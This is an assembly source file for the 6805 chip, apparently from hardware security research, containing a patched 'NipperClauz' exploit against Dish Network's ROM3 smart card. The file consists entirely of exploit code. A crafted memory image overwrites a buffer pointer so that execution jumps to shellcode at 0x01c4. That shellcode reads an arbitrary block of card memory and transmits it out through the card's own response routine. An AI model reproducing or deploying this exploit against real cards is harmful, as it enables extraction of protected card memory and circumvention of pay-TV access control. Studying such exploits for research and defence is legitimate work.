;;; Patched NipperClauz exploit for Dish Network's ROM3 card.
;;; Travis Goodspeed, 2022

	.lang 6805
        .org 0x019c


;;;  Handy symbols for ROM3.
        .equ RESPONDAX 0x757f   ; Transmit a response with header and checksum.
        .equ RESET 0x401E       ; ROM Reset Handler
        .equ RESYNC 0x4177
        .equ STARTUP 0x7305
        .equ STACKCHECK 0x40ed  ; ROM function to check the call stack.
        .equ IDLETOP 0x7385
        .equ BACKTOIDLE 0x7a48
        .equ BLOCKPARROT 0x7A4C 

base:   
;;; Early part will be clobbered by our transmit script.
        .db "NipperTool", 0x00
        

;;; Code can go here, at 0x01c4.
        .org 0x01c4

	;; Data buffer is at 0x019C.  We copy backward from the last byte.
	ldx #0x20
loop:
	lda @0xffff, x          ; 0xffff replaced with source address.
	sta @0x01a1, x          ; 0x01a1 is end of buffer in SRAM, begins at 0x19c.
	dec x
	bpl loop


        rsp
        
        ;; Call respondax(0x93, 0x40) to transmit packet.
	lda #0x93		; Response code 0x93.
	ldx #0x40		; Length in bytes.  Longer than our message.
 	jp RESPONDAX		; Send response.
;;;        jsr RESPONDAX		; Send response.

spin:   mul a, x
        mul a, x
        mul a, x

        bra spin
        jp RESET


;;; This is a 32 byte gap at 0x1200 (ghost of 0x0000)
;;; These 32 bytes always read as zero, are not a mirror of registers.
        .org 0x0200
        .db "Register gap."

        
        .org 0x0220
;;; These are the early global variables at 0x0220 (ghost of 0x0020).
;;; The 81 bytes are RTS bytes, so that 0x24 and 0x2a can hold RAM instructions.
;;;         .db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00,
;;; 	.db 0x00, 0x00, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00,
        .db 0x00, 0x01, 0x02, 0x03,
	.db 0x05, 0x0A, 0x06, 0x07,
	.db 0x08, 0x09, 0x0A, 0x0B,
	.db 0x0C, 0x0D, 0x0E, 0x0F,
        
        .org 0x0230
;;; 0505 in Headend, 0101 in Nipper.
FLAGS0: .db 0x01
FLAGS1: .db 0x01
	.db 0x00, 0x00,         ; More flags.
NAD:    .db 0x21
PCB:    .db 0x00                ; 00 returns 40
LEN:    .db 0xff
        .db 0, 0, 0, 0, 0, 0

;;; Data pointer when copying.
BPTR:   .db 0xa1                ; Bytes copied so far. (DC in Nipper)
NIB:    .db 0x34                ; Number of Information Bytes
;;; Sets the next byte to (0x19c+IFPTR+1).
;;; C3 in NipperClauz makes the next bytes load to 0x260 (0x60).
;;; DF in Headend makes the next byte load to 0x7C, the top of stack.
IFPTR:  .db 0xdf                ; Pointer to target information.

	;; These bytes set the entry point of 0x0060.
        .db 0x01, 0xc4, 0x01, 0xc4      ; Early entry, to shellcode at 0x019c.
	;; .db 0x00, 0x00, 0x02, 0x60  ; Late entry, to shellcode at 0x0260.



